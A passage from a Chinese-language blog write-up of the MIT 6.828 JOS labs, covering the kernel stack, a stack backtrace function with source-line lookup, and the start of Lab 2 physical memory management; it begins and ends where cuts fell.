“rld”；如果是大端序的话前者不会有变化而后者因为直接碰到 “\0” 于是什么也不输出</p></li><li><p>In the following code, what is going to be printed after <code>'y='</code>? (note: the answer is not a specific value.) Why does this happen?</p><p>cprintf(“x=%d y=%d”, 3);</p><p>y会是一个相对随机的值，有一定概率会是一个指向栈上的指针（old rbp），关键得看编译器生成的代码；这是因为我们在调用 cprintf 时在格式字符串中写有两个参数，但我们只传了一个参数，cprintf 会从栈上存放 3 的位置再往后读一个参数打印出来</p></li><li><p>Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>使用最后一个参数来指定参数的数量即可。</p></li></ol><p>最后还有个打印不同颜色的 Challenge，懒得做了</p><h3 id="The-Stack">The Stack</h3><p>这一节主要讲 x86 下 C 的函数运行时栈与调用约定，并编写一个能够打印堆栈 backtrace 的函数（类似于 Linux 内核 crash 以后打印错误的那种函数）</p><p>首先是 Exercise 9，找到内核栈初始化的代码、内核栈在内存中的位置，以及内核保留栈空间的方法与堆栈指针被初始化指向该空间的位置</p><blockquote><p>Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which “end” of this reserved area is the stack pointer initialized to point to?</p></blockquote><p>在内核入口函数中在调用 <code>i386_init()</code> 之前有一段代码初始化了内核栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Clear the frame pointer register (EBP)<br># so that once we get into debugging C code,<br># stack backtraces will be terminated properly.<br>movl    $0x0,%ebp            # nuke frame pointer<br><br># Set the stack pointer<br>movl    $(bootstacktop),%esp<br><br># now to C code<br>call    i386_init<br></code></pre></td></tr></table></figure><p>我们上手调试一下，结果如下，我们看到堆栈指针寄存器（esp）指向 <code>0xf0110000</code>，而栈帧指针寄存器（ebp）指向 0 地址，关于这两个寄存器之间的关系笔者不再赘叙，请各位读者自行复习 C 函数调用栈相关知识，可以看到这里我们的内核栈被初始化到内存高地址中一个固定的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gdb">relocated () at kern/entry.S:74<br>74        movl    $0x0,%ebp            # nuke frame pointer<br>(gdb) si<br>=&gt; 0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp<br>relocated () at kern/entry.S:77<br>77        movl    $(bootstacktop),%esp<br>(gdb) si<br>=&gt; 0xf0100039 &lt;relocated+10&gt;:    call   0xf01000aa &lt;i386_init&gt;<br>80        call    i386_init<br>(gdb) info registers<br>eax            0xf010002f          -267386833<br>ecx            0x0                 0<br>edx            0xffffff40          -192<br>ebx            0x10094             65684<br>esp            0xf0110000          0xf0110000 &lt;entry_pgtable&gt;<br>ebp            0x0                 0x0<br>esi            0x10094             65684<br>edi            0x0                 0<br>eip            0xf0100039          0xf0100039 &lt;relocated+10&gt;<br>eflags         0x86                [ PF SF ]<br>cs             0x8                 8<br>ss             0x10                16<br>ds             0x10                16<br>es             0x10                16<br>fs             0x10                16<br>gs             0x10                16<br>(gdb) <br></code></pre></td></tr></table></figure><p>6.828 文档中向我们揭示了栈回溯的原理：按照 C 函数调用栈的相关约定，ebp指针指向栈底，这个位置上存放了上一层调用的 ebp，再往后一个位置存放的是该函数的返回地址，即上层调用函数中调用了这个函数的指令的下一条指令的地址，因此利用 ebp 我们便可以回溯多层函数调用栈</p><p>下面看 Exercise 10，主要是让我们通过调试感知 C 函数调用栈</p><blockquote><p>Exercise 10. To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function in obj/kern/kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">tools</a> page or on Athena. Otherwise, you’ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><p>然后是 Exercise 11，让我们补全实现 <code>mon_backtrace()</code></p><blockquote><p>Exercise 11. Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn’t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p><p>If you use <code>read_ebp()</code>, note that GCC may generate “optimized” code that calls <code>read_ebp()</code> <em>before</em> <code>mon_backtrace()</code>'s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of <code>mon_backtrace()</code> and make sure the call to <code>read_ebp()</code> is happening after the function prologue.</p></blockquote><p>我们需要实现打印如下格式的栈回溯</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">Stack backtrace:<br>  ebp f0109e58  eip f0100a62  args <span class="hljs-number">00000001</span> f0109e80 f0109e98 f0100ed<span class="hljs-number">2 00000031</span><br>  ebp f0109ed8  eip f<span class="hljs-number">01000d6</span>  args <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> f<span class="hljs-number">0100058</span> f0109f<span class="hljs-number">28 00000061</span><br>  ...<br></code></pre></td></tr></table></figure><p>在内核初始化时将 ebp 设为了0，这提供给我们一个很好的作为判断栈回溯终止的条件，最终的栈回溯函数代码如下，由于 6.828 说他们提供的 <code>read_ebp()</code> 函数可能会被编译器优化掉所以笔者自己写了内联汇编：</p><blockquote><p>AT &amp; T 语法，非常🥚疼</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下，成功打印栈回溯：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br>sed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit<br>qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log <br>6828 decimal is 15254 octal!<br>entering test_backtrace 5<br>entering test_backtrace 4<br>entering test_backtrace 3<br>entering test_backtrace 2<br>entering test_backtrace 1<br>entering test_backtrace 0<br>Stack backtrace:<br>  ebp f010ff18  eip f01000a5  args 00000000 00000000 00000000 f010004e f0111308<br>  ebp f010ff38  eip f010007a  args 00000000 00000001 f010ff78 f010004e f0111308<br>  ebp f010ff58  eip f010007a  args 00000001 00000002 f010ff98 f010004e f0111308<br>  ebp f010ff78  eip f010007a  args 00000002 00000003 f010ffb8 f010004e f0111308<br>  ebp f010ff98  eip f010007a  args 00000003 00000004 00000000 f010004e f0111308<br>  ebp f010ffb8  eip f010007a  args 00000004 00000005 00000000 f010004e f0111308<br>  ebp f010ffd8  eip f01000fc  args 00000005 00001aac 00000640 00000000 00000000<br>  ebp f010fff8  eip f010003e  args 00000003 00001003 00002003 00003003 00004003<br>leaving test_backtrace 0<br>leaving test_backtrace 1<br>//...<br></code></pre></td></tr></table></figure><p>最后是 lab 1 的最后一个练习——Exercise 12，要求我们打印栈回溯信息的同时打印函数名、函数位于的源文件及他们在源文件中的行号</p><blockquote><p>Exercise 12. Modify your stack backtrace function to display, for each eip, the function name, source file name, and line number corresponding to that eip.</p><p>In <code>debuginfo_eip</code>, where do _<em>STAB</em>* come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do:</p><ul><li>look in the file kern/kernel.ld for _<em>STAB</em>*</li><li>run objdump -h obj/kern/kernel</li><li>run objdump -G obj/kern/kernel</li><li>run gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern/init.c, and look at init.s.</li><li>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</li></ul><p>Complete the implementation of <code>debuginfo_eip</code> by inserting the call to <code>stab_binsearch</code> to find the line number for an address.</p><p>Add a backtrace command to the kernel monitor, and extend your implementation of <code>mon_backtrace</code> to call <code>debuginfo_eip</code> and print a line for each stack frame of the form:</p><p>K&gt; backtrace<br>Stack backtrace:<br>ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000<br>kern/monitor.c:143: monitor+106<br>ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000<br>kern/init.c:49: i386_init+59<br>ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff<br>kern/entry.S:70: +0<br>K&gt;</p><p>Each line gives the file name and line within that file of the stack frame’s eip, followed by the name of the function and the offset of the eip from the first instruction of the function (e.g., monitor+106 means the return eip is 106 bytes past the beginning of monitor).</p><p>Be sure to print the file and function names on a separate line, to avoid confusing the grading script.</p><p>Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. <code>printf(&quot;%.*s&quot;, length, string)</code> prints at most <code>length</code> characters of <code>string</code>. Take a look at the printf man page to find out why this works.</p><p>You may find that some functions are missing from the backtrace. For example, you will probably see a call to <code>monitor()</code> but not to <code>runcmd()</code>. This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of the -O2 from GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly).</p></blockquote><p>我们如果要从头实现这个功能的话可能会有点麻烦，好在 JOS 为我们提供了一个可以实现该功能的库函数 <code>debuginfo_eip()</code>，直接拿来用就行</p><p>在拿来用之前我们需要注意其并未实现行号功能，我们还需要手动在 <code>kern/debug.c</code> 中补全实现，这一块原理比较复杂，主要靠其提供的 <code>stab_binsearch()</code> 函数实现，感兴趣的可以了解一下 stab：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Search within [lline, rline] for the line number stab.</span><br><span class="hljs-comment">// If found, set info-&gt;eip_line to the right line number.</span><br><span class="hljs-comment">// If not found, return -1.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    There&#x27;s a particular stabs type used for line numbers.</span><br><span class="hljs-comment">//    Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span><br><span class="hljs-comment">//    which one.</span><br><span class="hljs-comment">// Your code here.</span><br>stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr - info-&gt;eip_fn_addr);<br><br><span class="hljs-keyword">if</span> (lfun &lt;= rfun)<br>&#123;<br>    info-&gt;eip_line = stabs[lfun].n_desc;<br>&#125;<br>  <span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 backtrace 中需要注意的是其提供的函数名指针并非以 <code>\0</code> 结尾所以我们还需要手动指定输出长度，最终 backtrace 函数的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Eipdebuginfo</span> <span class="hljs-title">eipdebuginfo</span>;</span><br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        debuginfo_eip(last_eip, &amp;eipdebuginfo);<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        cprintf(<span class="hljs-string">&quot;         %s:%d: &quot;</span>, <br>            eipdebuginfo.eip_file, eipdebuginfo.eip_line);<br>        cprintf(<span class="hljs-string">&quot;%.*s+%d\n&quot;</span>,<br>            eipdebuginfo.eip_fn_namelen, eipdebuginfo.eip_fn_name, last_eip - eipdebuginfo.eip_fn_addr);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终运行效果如下：</p><p><img src="https://s2.loli.net/2022/02/21/3JksWlBiI7VNYEG.png" alt="imagepng"></p><p>运行 <code>make grade</code> 以检查 lab 1 的完成情况，可以看到我们成功完成了 lab 1 的代码部分，至此， lab 1 结束</p><p><img src="https://s2.loli.net/2022/02/21/GM57bwBngJP6UdO.png" alt="imagepng"></p><h1>0x02.Lab 2: Memory Management</h1><p>在这一部分当中我们需要实现 OS kernel 的<strong>内存管理模块</strong>，分为两部分：</p><ul><li><p>物理内存分配器：我们需要将所有的物理内存以「页」为单位进行管理，并记录下各个页的状态（空闲或已被分配）、共享该页面的进程数量等，并实现分配与释放物理页的函数</p></li><li><p>虚拟内存分配器：我们需要完成对页表的管理，主要是实现虚拟地址到物理地址的映射的建立功能</p></li></ul><p>首先用 git 拉 lab2 的代码下来，这里笔者前面 lab 1 的代码没有 handin 所以前面提示了一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br>M    kern/kdebug.c<br>M    kern/monitor.c<br>M    lib/printfmt.c<br>Branch &#x27;lab2&#x27; set up to track remote branch &#x27;lab2&#x27; from &#x27;origin&#x27;.<br>Switched to a new branch &#x27;lab2&#x27;<br></code></pre></td></tr></table></figure><p>lab 2 新增了这些文件：</p><ul><li>inc/memlayout.h</li><li>kern/pmap.c</li><li>kern/pmap.h</li><li>kern/kclock.h</li><li>kern/kclock.c</li></ul><p><code>memlayout.h</code> 中描述了虚拟地址空间的布局，我们需要通过修改 <code>pmap.c</code> 来实现；在 <code>memlayout.h</code> 与 <code>pmap.h</code> 中定义了 <code>Pageinfo</code> 结构体，用以描述单个物理页，与 Linux 内核的做法类似，一个 Pageinfo 对应一张物理页，所以在该结构体中只需要存储该页的状态即可；<code>kclock.c</code> 与 <code>kclock.h</code> 用以操作电池后备时钟与 CMOS RAM 硬件，其在 BIOS 中记录了 PC 的物理内存容量与其他东西，在 <code>pmap.c</code> 中的代码需要读取该设备以计算可用物理内存，这部分代码 xv6 已经帮我们实现好了所以我们暂时不需要了解 CMOS 的原理</p><blockquote><p>在笔者的 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a> 中记录了三种获取可用物理内存容量与布局的方式，原型来自 Linux 内核</p></blockquote><p>在 <code>memlayout.h</code> 中对将要建立的内存布局描述如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/<span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> Virtual memory map:                                Permissions<br> <span class="hljs-symbol">*</span>                                                    kernel/user<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span>    4 Gig --------&gt;  +------------------------------+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">   Remapped Physical Memory   </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *    KERNBASE, ----&gt;  +------------------------------+ 0xf0000000      --+</span><br><span class="hljs-string"> *    KSTACKTOP        </span>|<span class="hljs-string">     CPU0&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">     CPU1&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     :              .               :                   </span>|<br> <span class="hljs-symbol">*</span>                     :              .               :                   |<span class="hljs-string"></span><br><span class="hljs-string"> *    MMIOLIM ------&gt;  +------------------------------+ 0xefc00000      --+</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Memory-mapped I/O      </span>|<span class="hljs-string"> RW/--  PTSIZE</span><br><span class="hljs-string"> * ULIM, MMIOBASE --&gt;  +------------------------------+ 0xef800000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">  Cur. Page Table (User R-)   </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UVPT      ----&gt;  +------------------------------+ 0xef400000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">          RO PAGES            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UPAGES    ----&gt;  +------------------------------+ 0xef000000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">           RO ENVS            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> * UTOP,UENVS ------&gt;  +------------------------------+ 0xeec00000</span><br><span class="hljs-string"> * UXSTACKTOP -/       </span>|<span class="hljs-string">     User Exception Stack     </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebff000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string"> --/--  PGSIZE</span><br><span class="hljs-string"> *    USTACKTOP  ---&gt;  +------------------------------+ 0xeebfe000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Normal User Stack       </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebfd000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">     Program Data &amp; Heap      </span>|<br> <span class="hljs-symbol">*</span>    UTEXT --------&gt;  +------------------------------+ 0x00800000<br> <span class="hljs-symbol">*</span>    PFTEMP -------&gt;  |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">        PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>    UTEMP --------&gt;  +------------------------------+ 0x00400000      --+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">  User STAB Data (optional)   </span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *    USTABDATA ----&gt;  +------------------------------+ 0x00200000        </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>    0 ------------&gt;  +------------------------------+                 --+<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> (<span class="hljs-symbol">*</span>) Note: The kernel ensures that <span class="hljs-string">&quot;Invalid Memory&quot;</span> is <span class="hljs-symbol">*</span>never<span class="hljs-symbol">*</span> mapped.<br> <span class="hljs-symbol">*</span>     <span class="hljs-string">&quot;Empty Memory&quot;</span> is normally unmapped, but user programs may map pages<br> <span class="hljs-symbol">*</span>     there if desired.  JOS user programs map pages temporarily at UTEMP.<br> <span class="hljs-symbol">*</span>/<br></code></pre></td></tr></table></figure><h2 id="Part-1-Physical-Page-Management">Part 1: Physical Page Management</h2><p>操作系统应当要管理好内存中的每一张内存页，JOS 同样以页为粒度进行管理，在本部分中我们需要为 JOS 编写一个物理内存页分配器，其使用一个链表来将空闲的物理页对应的 Pageinfo 结构体相连</p><p>在 Exercise 1 中要求我们实现该物理内存页分配器的几个函数</p><blockquote><p>Exercise 1. In the file kern/pmap.c, you must implement code for the following functions (probably in the order given).</p><p><code>boot_alloc()</code><br><code>mem_init()</code> (only up to the call to <code>check_page_free_list(1)</code>)<br><code>page_init()</code><br><code>page_alloc()</code><br><code>page_free()</code></p><p><code>check_page_free_list()</code> and <code>check_page_alloc()</code> test your physical page allocator. You should boot JOS and see whether <code>check_page_alloc()</code> reports success. Fix your code so that it passes. You may find it helpful to add your own <code>assert()</code>s to verify that your assumptions are correct.</p></blockquote><p>笔者本人很想直接写一个 buddy system（笑），但一是技术力好像不大够的样子，二是在对 JOS 没有足够了解的情况下还是先按照给的注释来实现</p><p>我们先来看 <code>kern/pmap.c</code> ，在一开头声明了这几个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// These variables are set by i386_detect_memory()</span><br><span class="hljs-type">size_t</span> npages;<span class="hljs-comment">// Amount of physical memory (in pages)</span><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> npages_basemem;<span class="hljs-comment">// Amount of base memory (in pages)</span><br><br><span class="hljs-comment">// These variables are set in mem_init()</span><br><span class="hljs-type">pde_t</span> *kern_pgdir;<span class="hljs-comment">// Kernel&#x27;s initial page directory</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pages</span>;</span><span class="hljs-comment">// Physical page state array</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">page_free_list</span>;</span><span 